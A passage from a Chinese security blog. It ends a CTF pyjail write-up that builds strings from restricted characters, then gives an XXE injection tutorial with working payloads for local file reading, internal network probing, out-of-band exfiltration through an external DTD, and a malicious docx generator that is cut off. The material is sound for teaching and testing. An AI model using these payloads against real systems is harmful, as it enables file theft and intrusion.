class="number">1</span> <span class="keyword">is</span> <span class="keyword">not</span> a valid character</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag(<span class="string">'@'</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;console&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">"/home/app/problem.py"</span>, line <span class="number">23</span>, <span class="keyword">in</span> get_flag</span><br><span class="line">    <span class="keyword">if</span>(eval(input) == super_secret_string):</span><br><span class="line">  File <span class="string">"&lt;string&gt;"</span>, line <span class="number">1</span></span><br><span class="line"><span class="meta">    @</span></span><br><span class="line">    ^</span><br><span class="line">SyntaxError: unexpected EOF <span class="keyword">while</span> parsing</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(get_flag)</span><br><span class="line">[<span class="string">'__call__'</span>, <span class="string">'__class__'</span>, <span class="string">'__closure__'</span>, <span class="string">'__code__'</span>, <span class="string">'__defaults__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__dict__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__format__'</span>, <span class="string">'__get__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__globals__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__module__'</span>, <span class="string">'__name__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'func_closure'</span>, <span class="string">'func_code'</span>, <span class="string">'func_defaults'</span>, <span class="string">'func_dict'</span>, <span class="string">'func_doc'</span>, <span class="string">'func_globals'</span>, <span class="string">'func_name'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(get_flag.func_code)</span><br><span class="line">[<span class="string">'__class__'</span>, <span class="string">'__cmp__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__le__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'co_argcount'</span>, <span class="string">'co_cellvars'</span>, <span class="string">'co_code'</span>, <span class="string">'co_consts'</span>, <span class="string">'co_filename'</span>, <span class="string">'co_firstlineno'</span>, <span class="string">'co_flags'</span>, <span class="string">'co_freevars'</span>, <span class="string">'co_lnotab'</span>, <span class="string">'co_name'</span>, <span class="string">'co_names'</span>, <span class="string">'co_nlocals'</span>, <span class="string">'co_stacksize'</span>, <span class="string">'co_varnames'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.func_code.co_consts</span><br><span class="line">(<span class="keyword">None</span>, <span class="string">'this_is_the_super_secret_string'</span>, <span class="number">48</span>, <span class="number">57</span>, <span class="number">65</span>, <span class="number">90</span>, <span class="number">97</span>, <span class="number">122</span>, <span class="number">44</span>, <span class="number">95</span>, <span class="string">' is not a valid character'</span>, <span class="string">'%\xcb'</span>, <span class="string">"You didn't guess the value of my super_secret_string"</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>探索后猜测要求向<code>get_flag()</code> 函数传入一个字符串，eval执行后等于super_secret_string就会返回flag。</p><p><code>48, 57, 65, 90, 97, 122, 44, 95</code> 应该意味着ASCII值为 48~57，65~90，97~122，44和95的字符不被允许，也就是 <code>[a-zA-Z0-9,_]</code> 被禁用了，测试一下发现确实如此。此外 <code>&#39;%\xcb&#39;</code> 字符串也是一个提示。</p><p>这题应该是对 <a href="https://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape/" target="_blank" rel="noopener">A python’s escape from PlaidCTF jail</a> 的复现。主要目标是通过有限的字符 集 <code>({[&lt;&#39;&quot;:~%c&gt;]})</code> 构造出任意的字符串。主要思路如下：</p><ul><li><p><code>[]&lt;{}</code> 逻辑值为True，等价于1；<code>[]&lt;[]</code> 逻辑值为False，等价于0。</p></li><li><p>由1和0，结合按位取反<code>~</code> 和移位 <code>&lt;&lt;</code> 可以得到任意整数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brainfuckize</span><span class="params">(nb)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> nb <span class="keyword">in</span> [<span class="number">-2</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">"~(&#123;&#125;&lt;[])"</span>, <span class="string">"~([]&lt;[])"</span>, <span class="string">"([]&lt;[])"</span>, <span class="string">"(&#123;&#125;&lt;[])"</span>][nb + <span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> nb % <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"~%s"</span> % brainfuckize(~nb)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"(%s&lt;&lt;(&#123;&#125;&lt;[]))"</span> % brainfuckize(nb / <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="comment"># 实际上这个函数就足够了，但生成的结果长度会比第一个长很多。</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"([]&lt;[])"</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"~%s"</span> % f(~n) <span class="keyword">if</span> n % <span class="number">2</span> <span class="keyword">else</span> <span class="string">"(%s&lt;&lt;(&#123;&#125;&lt;[]))"</span> % f(n / <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> f(<span class="number">5</span>), eval(brainfuckize(<span class="number">5</span>)) == <span class="number">5</span></span><br><span class="line"><span class="comment"># ~(~(~(~([]&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[])) True</span></span><br></pre></td></tr></table></figure></li><li><p>字符串 <code>%\xcb</code> 由<code>%</code> 和 <code>\xcb)</code> 两个字符构成。<code>repr(&#39;%\xcb&#39;)</code> 会得到一个七字符的字符串，其中包含<code>%</code> 和 <code>c</code> 。结合上面的得到的整数就可以构造任意字符了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> repr(<span class="string">'%\xcb'</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">print</span> i,</span><br><span class="line">...</span><br><span class="line"><span class="string">' % \ x c b '</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> `<span class="string">'%\xcb'</span>`:</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">print</span> i,</span><br><span class="line">...</span><br><span class="line"><span class="string">' % \ x c b '</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>`<span class="string">'%\xcb'</span>`[<span class="number">1</span>::<span class="number">3</span>]</span><br><span class="line"><span class="string">'%c'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>`<span class="string">'%\xcb'</span>`[<span class="number">1</span>::<span class="number">3</span>]%<span class="number">97</span> == chr(<span class="number">97</span>)</span><br><span class="line"><span class="keyword">True</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>在Python2 中 ，反引号包裹是 <code>repr()</code> 的快捷方式，效果完全一致。在Python3中反引号被废除了。</p></li><li><p>接下来就可以构造任意字符串并传给<code>get_flag()</code>了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bf</span><span class="params">(nb)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> nb <span class="keyword">in</span> [<span class="number">-2</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">"~(&#123;&#125;&lt;[])"</span>, <span class="string">"~([]&lt;[])"</span>, <span class="string">"([]&lt;[])"</span>, <span class="string">"(&#123;&#125;&lt;[])"</span>][nb + <span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> nb % <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"~%s"</span> % bf(~nb)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"(%s&lt;&lt;(&#123;&#125;&lt;[]))"</span> % bf(nb / <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_single_char</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"`'%\\xcb'`["</span> + bf(<span class="number">1</span>) + <span class="string">"::"</span> + bf(<span class="number">3</span>) + <span class="string">"]%("</span> + bf(ord(c)) + <span class="string">")"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">secret = <span class="string">"this_is_the_super_secret_string"</span></span><br><span class="line">cmd = <span class="string">'get_flag("%s")'</span> % (<span class="string">'+'</span>.join(gen_single_char(i) <span class="keyword">for</span> i <span class="keyword">in</span> secret))</span><br><span class="line"><span class="keyword">print</span> cmd</span><br><span class="line"><span class="comment"># tjctf&#123;wh0_kn3w_pyth0n_w4s_s0_sl1pp3ry&#125;</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="1534253889627.png" alt="1534253889627"></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>XML外部实体注入小结</title>
      <link href="/180811-xxe-injection/"/>
      <url>/180811-xxe-injection/</url>
      
        <content type="html"><![CDATA[<p><strong>本文发自 <a href="https://xz.aliyun.com/t/2571" target="_blank" rel="noopener">先知社区</a> ，转载请注明出处。</strong> </p><p>（ 这个问题资料很多了，细节也颇多，本文涉及的内容只是最基本的，描述得也难比以往的好，仅仅是记录所学。对于已经理解XXE基本情况的读者，阅读真实案例和生成恶意Word文档两部分可能会有收获。）</p><h1 id="WHAT"><a href="#WHAT" class="headerlink" title="WHAT"></a>WHAT</h1><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>XML是类似HTML的标记语言，但它们有所不同。</p><ul><li>其一，HTML用于表现数据，关注数据的表现形式，XML用于存储和传输数据，关注数据本身。</li><li>其二，HTML的标签是预定义的，而XML的标签是自定义的，或者说，任意的。</li><li>此外，XML语法更严格，其标签必须闭合且正确嵌套，大小写敏感，属性值必须加引号，保留连续空白符。</li><li><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code>  称为 <code>XML prolog</code> ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。</li></ul><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>XML元素以形如 <code>&lt;tag&gt;foo&lt;/tag&gt;</code> 的标签开始和结束，如果元素内部出现如<code>&lt;</code> 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义了五个实体引用，即用<code>&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot;</code> 替换 <code>&lt; &gt; &amp; &#39; &quot;</code> 。</p><p>实际上，实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。DTD是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。</p><p>DTD有两种形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">内部 DTD：&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br><span class="line">外部 DTD：</span><br><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;存放元素声明的文件的URI，可以是本地文件或网络文件&quot; [可选的元素声明]&gt;</span><br><span class="line">&lt;!DOCTYPE 根元素 PUBLIC &quot;PUBLIC_ID DTD的名称&quot; &quot;外部DTD文件的URI&quot;&gt;</span><br><span class="line">（ PUBLIC表示 DTD文件是公共的，解析器先分析 DTD名称，没查到再去访问 URI）</span><br></pre></td></tr></table></figure><h2 id="ENTITY"><a href="#ENTITY" class="headerlink" title="ENTITY"></a>ENTITY</h2><p>我们可以在元素声明中自定义实体，和DTD类似也分为内部实体和外部实体，此外还有普通实体和参数实体之分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">声明：</span><br><span class="line">&lt;!DOCTYPE 根元素 [&lt;!ENTITY 内部普通实体名 &quot;实体所代表的字符串&quot;&gt;]&gt;</span><br><span class="line">&lt;!DOCTYPE 根元素 [&lt;!ENTITY 外部普通实体名 SYSTEM &quot;外部实体的URI&quot;&gt;]&gt;</span><br><span class="line">&lt;!DOCTYPE 根元素 [&lt;!ENTITY % 内部参数实体名 &quot;实体所代表的字符串&quot;&gt;]&gt;</span><br><span class="line">&lt;!DOCTYPE 根元素 [&lt;!ENTITY % 外部参数实体名 SYSTEM &quot;外部实体的URI&quot;&gt;]&gt;</span><br><span class="line">除了 SYSTEM关键字外，外部实体还可用 PUBLIC关键字声明。</span><br><span class="line">引用：</span><br><span class="line">&amp;普通实体名; //经实验，普通实体既可以在 DTD中，也可以在 XML中引用，可以在声明前引用，可以在在元素声明内部引用</span><br><span class="line">%参数实体名; //经实验，参数实体只能在 DTD中引用，不能在声明前引用,不能在元素声明内部引用</span><br></pre></td></tr></table></figure><h2 id="可能造成的危害"><a href="#可能造成的危害" class="headerlink" title="可能造成的危害"></a>可能造成的危害</h2><ul><li>本地文件读取</li><li>内网访问，主机/端口扫描</li><li>网络访问</li><li>系统命令执行（特定协议，如PHP的expect）</li><li>拒绝服务（嵌套引用，指数爆炸）</li></ul><h1 id="HOW"><a href="#HOW" class="headerlink" title="HOW"></a>HOW</h1><p>URI支持的协议：</p><p><img src="1534066968195.png" alt="scheme support"></p><h2 id="利用引用外部DTD发起网络请求"><a href="#利用引用外部DTD发起网络请求" class="headerlink" title="利用引用外部DTD发起网络请求"></a>利用引用外部DTD发起网络请求</h2><p><code>test.php</code> 使用外部DTD对XML进行验证，如果XML可以注入且DTD的URI可控，就有发起网络请求的可能。在<code>192.168.1.2:80</code> 有Web服务而<code>192.168.1.3:80</code> 没有，DTD的URI不同时访问 <code>test.php</code> 就会得到不同的响应。</p><p>test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument;</span><br><span class="line">$dom-&gt;load(<span class="string">'with_external_dtd.xml'</span>);</span><br><span class="line"><span class="keyword">if</span> ($dom-&gt;validate()) &#123;<span class="keyword">echo</span> <span class="string">"validated!\n"</span>;&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"invalid!\n"</span>;</span><br></pre></td></tr></table></figure><p>with_external_dtd.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 很快返回 validated! --&gt;</span></span><br><span class="line">    <span class="meta">&lt;!DOCTYPE note SYSTEM "external_dtd"&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 很快返回 invalid! --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;!DOCTYPE note SYSTEM "http://192.168.1.2/"&gt; --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 很长一段时间才返回 invalid! --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;!DOCTYPE note SYSTEM "http://192.168.1.3/"&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>Valar Morghulis<span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>external_dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><h2 id="利用普通XXE读取文件-访问网络"><a href="#利用普通XXE读取文件-访问网络" class="headerlink" title="利用普通XXE读取文件/访问网络"></a>利用普通XXE读取文件/访问网络</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$s=<span class="string">&lt;&lt;&lt;string</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE a [&lt;!ENTITY b SYSTEM "file:///C:/Windows/win.ini"&gt;]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">string;</span></span><br><span class="line"><span class="keyword">echo</span> simplexml_load_string($s);</span><br></pre></td></tr></table></figure><h2 id="利用参数XXE读取文件-访问网络"><a href="#利用参数XXE读取文件-访问网络" class="headerlink" title="利用参数XXE读取文件/访问网络"></a>利用参数XXE读取文件/访问网络</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$s=<span class="string">&lt;&lt;&lt;string</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE a [&lt;!ENTITY % b SYSTEM "http://127.0.0.1:8088/evil.txt"&gt;%b;]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;d;&lt;/c&gt;</span></span><br><span class="line"><span class="string">string;</span></span><br><span class="line"><span class="keyword">echo</span> simplexml_load_string($s);</span><br><span class="line"><span class="comment">// evil.txt :  &lt;!ENTITY d SYSTEM "php://filter/convert.base64-encode/resource=C:/Windows/win.ini"&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XXE-OOB"><a href="#XXE-OOB" class="headerlink" title="XXE OOB"></a>XXE OOB</h2><p>如果没有回显也没关系，可以利用外部参数实体将文件内容发送出去。这里注意参数实体引用 <code>%file;</code> 必须放在外部文件里，因为根据这条 <a href="https://www.w3.org/TR/xml/#wfc-PEinInternalSubset" target="_blank" rel="noopener">规则</a> ，在内部DTD里， 参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则parser会报错： <code>PEReferences forbidden in internal subset</code> 。这里的<code>internal subset</code> 指的是中括号<code>[]</code> 内部的一系列元素声明，<code>PEReferences</code> 指的应该是参数实体引用 <code>Parameter-Entity Reference</code> 。</p><p>感觉在技术方面英文的表达力更强，这种情况叫做 <code>fetch external parsed entities using PEReference</code> 更好理解。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$s=<span class="string">&lt;&lt;&lt;string</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE a [&lt;!ENTITY % xxe SYSTEM "http://127.0.0.1:8088/xxe.txt"&gt; %xxe;]&gt;</span></span><br><span class="line"><span class="string">string;</span></span><br><span class="line">simplexml_load_string($s);</span><br><span class="line"><span class="comment">/* // http://127.0.0.1:8088/xxe.txt:</span></span><br><span class="line"><span class="comment">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=C:/Windows/win.ini"&gt;</span></span><br><span class="line"><span class="comment">&lt;!ENTITY % x '&lt;!ENTITY &amp;#37; send SYSTEM "http://127.0.0.1:8088/%file;"&gt;'&gt; %x;</span></span><br><span class="line"><span class="comment">%send;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h1 id="真实案例"><a href="#真实案例" class="headerlink" title="真实案例"></a>真实案例</h1><ul><li>在线文件预览引起的问题，修改docx文件的word/document.xml，添加DTD和实体引用，即可触发。<ul><li>WooYun-2014-73321（网易邮箱某处XXE可读取文件）</li><li>WooYun-2014-73439（QQ邮箱XXE可读取任意文件）</li><li>……</li></ul></li><li>直接处理POST XML数据。WooYun-2015-109725（中通某处XXE漏洞可读取服务器任意文件）等很多。许多是直接 <code>simplexml_load_string</code> 处理POST进来的数据。可控字符串出现在XML文件里就要引起注意。</li><li>XML处理工具<ul><li>WooYun-2014-59911（从开源中国的某XXE漏洞到主站shell）格式化XML。</li><li>WooYun-2015-134057（百度某平台Blind XXE漏洞&amp;可Bool型SSRF攻击）XML检查工具。</li><li>WooYun-2015-135397（搜狗某平台Blind XXE漏洞(读取文件/SSRF/Struts2命令执行) XML检查工具</li></ul></li><li>WooYun-2014-58381（百度某功能XML实体注入）该功能点提供svg转jpg服务，通过构造特殊svg文件注入。</li><li>WooYun-2014-74069（鲜果网RSS导入Blind XXE漏洞 ）导入OPML文件。</li><li>WooYun-2015-111828（博客园某处XXE可下载任意文件）博客搬家功能，导入XML。</li><li>WooYun-2015-117316（用友人力资源管理软件全版本XXE漏洞  ）登陆与重置密码时使用XML传输数据。</li><li>WooYun-2015-148793（AOL Website XML External Entity(XXE) Vulnerability）xmlrpc service。</li><li>WooYun-2015-156208（国际php框架slim架构上存在XXE漏洞（XXE的典型存在形式））服务端根据请求的 <code>content-type</code> 来区别对待提交的数据。<code>application/x-www-form-urlencoded</code> 、<code>application/json</code> 、<code>application/xml</code> 被用不同的方式解析。XML直接调用 <code>simplexml_load_string</code> 处理导致漏洞。有趣的是旧版本对该问题做了防范，新版本去除了相关代码，可能是觉得新版本对PHP版本需求在5.5以上。实际上PHP是否解析外部实体与本身版本无关，与编译时libxml库版本有关。</li><li>WooYun-2016-168457（唯品会存在Blind XXE 漏洞）。作者说 <code>关于XXE,觉得漏洞本身没太多的玩点，比较有意思主要在于：不同语言处理URI的多元化和不同XML解析器在解析XML的一些特性。</code> ，我觉得有道理。<code>xfire是流行的webservice开发组件，其在invoke时使用了STAX解析XML导致XML实体注入发生</code> 。乌云上一大波XXE洞都是这个，详细说明见 WooYun-2016-166751(Xfire文件读取漏洞)。</li><li>WooYun-2014-59911（从开源中国的某XXE漏洞到主站shell）XXE读取到脚本文件<code>/home/run/ssh_go.sh</code> ，内含SSH登陆密码 orz。</li><li>一些其他案例<ul><li><a href="https://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution" target="_blank" rel="noopener">XXE in OpenID: one bug to rule them all, or how I found a Remote Code Execution flaw affecting Facebook’s servers</a> 【Facebook OpenID功能点的XRDS XXE】<ul><li><a href="https://sensepost.com/blog/2014/revisting-xxe-and-abusing-protocols/" target="_blank" rel="noopener">Revisting XXE and abusing protocols</a> 的分析者利用该原理在其他OpenID平台结合expect模块实现了RCE。</li></ul></li><li><a href="https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745" target="_blank" rel="noopener">XXE on Windows system …then what ??</a> 【XXE+SMB=&gt;内网RCE】</li><li><a href="https://xz.aliyun.com/t/2448" target="_blank" rel="noopener">Apache Solr XXE漏洞分析 -【CVE-2018-8026 】</a> </li><li><a href="https://hackerone.com/reports/395296" target="_blank" rel="noopener">Phone Call to XXE via Interactive Voice Response</a> 【打个电话也能XXE :)】</li></ul></li></ul><h1 id="发现XXE"><a href="#发现XXE" class="headerlink" title="发现XXE"></a>发现XXE</h1><p>尝试注入特殊字符，使XML失效，引发解析异常，明确后端使用XML传输数据。</p><ul><li>单双引号 <code>&#39; &quot;</code> 。XML的属性值必须用引号包裹，而数据可能进入标签的属性值。</li><li>尖括号<code>&lt; &gt;</code>。XML的开始/结束标签用尖括号包裹，数据中出现尖括号会引发异常。</li><li>注释符 <code>&lt;!--</code> 。XML使用 <code>&lt;!-- This is a comment --&gt;</code>  作注释。</li><li><code>&amp;</code> 。&amp; 用于引用实体。</li><li>CDATA 分隔符<code>]]&gt;</code> 。<code>&lt;![CDATA[foo]]&gt;</code> 中的内容不被parser解析，提前闭合引发异常。</li></ul><p>尝试利用实体和DTD。</p><ul><li>引用外部DTD文件访问内网主机/端口。<code>&lt;!DOCTYPE a SYSTEM &quot;http://127.0.0.1:2333&quot;&gt;</code> （看响应时间）</li><li>引用外部DTD文件访问外网。<code>&lt;!DOCTYPE a SYSTEM &quot;http://vps_ip&quot; &gt;</code></li><li>引用内部实体。<code>&lt;!DOCTYPE a [&lt;!ENTITY xxe &quot;findneo&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;</code></li><li>外部实体读本地文件。<code>&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/hosts&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;</code></li><li>外部实体访问内网主机/端口。<code>&lt;!DOCTYPE a SYSTEM &quot;http://192.168.1.2:80&quot;&gt;</code>（看响应时间）</li><li>外部实体访问外网。<code>&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM &quot;http://vps_ip&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;</code> </li><li>判断问题存在可以OOB提取数据。</li></ul><h1 id="生成恶意Word文档"><a href="#生成恶意Word文档" class="headerlink" title="生成恶意Word文档"></a>生成恶意Word文档</h1><p>上面提到的多个案例都需要用到自定义DTD的docx文件，有个名为 <a href="https://buer.haus/xxegen/" target="_blank" rel="noopener">XXEGen</a> 的在线网站可以方便地生成和监听（也可自定义监听地址），从而方便快速地测试XXE是否存在，但目前看来还不支持自定义DTD，如果需要用到OOB之类的技术，可能就不太方便。</p><p>所以我写了个小脚本，可以用来生成一个正常docx文件，然后注入自定义的DTD和实体引用。另外新版的word软件默认禁用DTD，trigger 函数还可以本地测试下word文件是否有问题。</p><p>其实修改 docx 文件的原理很简单，手动也可以做。解压 demo.docx 到 demo文件夹 ，直接修改 <code>demo/word/document.xml</code>  文件内容，全选 demo 文件夹中的文件，使用 7zip 的仅存储方式压缩成 demo2.docx 即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 